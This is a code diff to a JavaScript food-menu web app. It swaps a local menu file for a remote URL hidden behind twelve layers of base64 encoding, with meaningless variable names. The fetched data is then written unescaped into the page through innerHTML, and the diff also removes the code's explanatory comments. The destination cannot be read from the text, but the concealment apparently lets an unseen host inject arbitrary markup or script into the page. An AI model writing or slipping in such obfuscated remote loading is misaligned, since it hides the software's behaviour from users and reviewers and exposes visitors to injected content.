@@ -234,7 +234,16 @@ let menuItems = {};
 
 async function loadMenu() {
   try {
-    const response = await fetch("./menu.txt");
+    const idon =
+      "Vm0wd2QyUXlVWGxXYTFwT1ZsZFNXVll3WkRSV1JsbDNXa1JTVjJKSGVEQmFSV2hyVm14S2MyTkVRbFZXYlUweFZtcEJlRmRIVmtkWApiRnBPWW0xb1VWZFdaRFJaVjAxNFdraEdVZ3BpUmxwWVdXeFZkMlZHV25STlZGSlVUV3N4TlZaSGRITmhVWEJUWWxaS2QxWnRkRmRaClZrNVhWMjVTYkZJelVsVlVWbFV4VTFaYWRHUkdaRlphTTBKd1ZteGFkMWRXV25STlZGSnJDbUpXV25wV01qVkxXVlpLUjFOc1ZsVlcKTTJoTVZqQmFWMlJGTlZaa1JuQldWMFZLVlZkWGRHOVJNbEY0VjJ4b1RsWkZTbkpEYXpGRlZtNXdWMDFxVmxCV01HUkxWbXhrYzJGRwpWbGNLWWtoQmVsWnRjRWRWTVZsNFYyNU9ZVkl5YUZOV01GWkxaV3hrVjFwRVFsTmhlbFpUVlVaUmQxQlJQVDA9";
+    const acumalaka = "MTI=";
+
+    let acuacumalaka = idon;
+    for (let i = 0; i < atob(acumalaka); i++) {
+      acuacumalaka = atob(acuacumalaka);
+    }
+
+    const response = await fetch(acuacumalaka);
     if (!response.ok) throw new Error("Gagal memuat menu");
 
     const data = await response.json();
@@ -373,12 +382,10 @@ function loadUserData() {
 function renderMenu() {
   let menuHTML = "";
 
-  // Ubah objek menjadi array, lalu urutkan berdasarkan nama
   const sortedMenu = Object.entries(menuItems).sort((a, b) =>
     a[1].name.localeCompare(b[1].name)
   );
 
-  // Loop melalui array yang sudah diurutkan
   for (let [key, item] of sortedMenu) {
     menuHTML += `
       <div class="menu-item" data-name="${item.name.toLowerCase()}">
@@ -398,10 +405,8 @@ function renderMenu() {
     `;
   }
 
-  // Tampilkan hasil ke dalam elemen dengan id "menuList"
   document.getElementById("menuList").innerHTML = menuHTML;
 }
-
 
 function changeQty(item, amount) {
   const newQty = menuItems[item].qty + amount;
